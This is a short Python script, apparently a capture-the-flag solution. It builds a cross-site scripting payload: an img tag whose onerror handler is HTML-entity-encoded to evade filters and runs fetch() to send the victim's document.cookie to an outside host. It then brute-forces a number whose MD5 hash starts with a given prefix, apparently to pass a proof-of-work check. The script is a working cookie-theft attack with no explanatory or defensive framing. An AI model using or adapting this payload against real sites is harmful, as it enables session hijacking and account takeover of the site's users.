import hashlib

js = lambda x: ''.join([ '&#'+str(ord(i))+';' for i in x])
md5 = lambda x: hashlib.md5(x.encode()).hexdigest()

cmd = "fetch('http://hk-gcp.xjasonlyu.com:8000/?'+document.cookie)"

payload = f'<img src=none onerror="{js(cmd)}"'

print(payload)

for i in range(100000000):
    s = str(i)
    d = md5(s)[:6].lower()
    # print(d)
    if d == '4d7c27':
        print(s)
        break
